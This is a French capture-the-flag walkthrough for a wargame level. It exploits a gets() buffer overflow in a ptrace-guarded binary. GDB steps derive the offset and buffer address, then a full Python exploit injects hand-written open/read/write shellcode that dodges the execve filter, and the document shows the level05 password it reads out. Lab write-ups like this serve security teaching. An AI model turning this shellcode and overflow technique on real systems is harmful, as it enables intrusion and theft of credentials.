# Walkthrough — level04

## 1. Analyse du binaire

Le programme fork un processus fils et un père.

**Le fils** :
- Se déclare traceable avec `ptrace(PTRACE_TRACEME)`
- Affiche `"Give me some shellcode, k"`
- Lit l'entrée utilisateur avec `gets(buffer)` — buffer de **128 octets**, sans vérification de taille → **buffer overflow**

**Le père** :
- Surveille le fils via `ptrace`
- Attend (`wait`) que le fils change d'état
- Si le fils tente un `execve` (syscall n°11) → il le tue avec `kill(child, 9)`

La protection bloque tout shellcode classique qui ouvre un shell via `execve("/bin/sh")`.

---

## 2. Trouver le padding

On cherche combien d'octets il faut écrire avant d'écraser le **return address** de `main()`.

Dans GDB, il faut suivre le fils (sinon GDB suit le père bloqué dans `wait()`).

```bash
gdb ./level04
set follow-fork-mode child
```

Test avec 184 octets pour confirmer un crash :
```bash
python -c "print('A'*184 + 'BBBB')" > /tmp/input.txt
run < /tmp/input.txt
info registers eip
# → 0x41414141 : le return address est dans les A's, donc padding < 184
```

Recherche binaire :
- 164 → crash (EIP = A's) → padding < 164
- 152 → pas de crash → padding > 152
- 158 → EIP = `0x42424141` (A's et B's mélangés) → padding entre 156 et 158

```bash
python -c "print('A'*156 + 'BBBB')" > /tmp/input.txt
run < /tmp/input.txt
info registers eip
# → 0x42424242 ✓
```

**Padding = 156 octets.**

---

## 3. Trouver l'adresse du buffer

```bash
gdb ./level04
set follow-fork-mode child
break gets
run
x/x $esp+4
# → 0xffffd680
```

**Adresse du buffer = `0xffffd680`**

L'adresse obtenue sous GDB est légèrement plus basse qu'en exécution réelle, car GDB injecte des variables d'environnement qui décalent la stack. On vise donc `0xffffd6a0` (+0x20) en pratique.

---

## 4. Contourner la protection : shellcode sans execve

Puisque `execve` est bloqué par le père via ptrace, on écrit un shellcode qui :
1. Ouvre `/home/users/level05/.pass` (`open` = syscall 5)
2. Lit son contenu (`read` = syscall 3)
3. L'écrit sur stdout (`write` = syscall 4)
4. Quitte proprement (`exit` = syscall 1)

Aucun de ces syscalls n'est le n°11 → le père ne tue pas le fils.

---

## 5. Construction du payload

```
[ NOP sled (50 octets) ][ shellcode (83 octets) ][ padding ][ return address ]
```

- **NOP sled** (`\x90`) : absorbe le décalage d'adresse entre GDB et l'exécution réelle
- **Shellcode** : open/read/write sans execve
- **Padding** : complète jusqu'à 156 octets
- **Return address** : pointe vers le NOP sled (`0xffffd6a0`)

---

## 6. Script d'exploit

```python
import sys

shellcode = (
    "\xeb\x32\x5b"                               # jmp→call→pop ebx (adresse du path)
    "\x31\xc0\xb0\x05\x31\xc9\x31\xd2\xcd\x80"  # open(path, O_RDONLY, 0)
    "\x89\xc3\x83\xec\x40\x89\xe1"               # fd→ebx, buffer sur pile
    "\x31\xc0\xb0\x03\x31\xd2\xb2\x40\xcd\x80"  # read(fd, buf, 64)
    "\x89\xc2\x89\xe1"                           # bytes_lus→edx, buf→ecx
    "\x31\xc0\xb0\x04\x31\xdb\xb3\x01\xcd\x80"  # write(1, buf, bytes_lus)
    "\x31\xc0\xb0\x01\x31\xdb\xcd\x80"          # exit(0)
    "\xe8\xc9\xff\xff\xff"                       # call (retour vers pop ebx)
    "/home/users/level05/.pass\x00"
)

nop_sled = "\x90" * 50
payload  = nop_sled + shellcode
padding  = "A" * (156 - len(payload))
ret      = "\xa0\xd6\xff\xff"   # 0xffffd6a0

sys.stdout.write(payload + padding + ret)
```

```bash
python /tmp/exploit.py | ./level04
# → 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

---

## 7. Passer au niveau suivant

```bash
su level05
# Password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
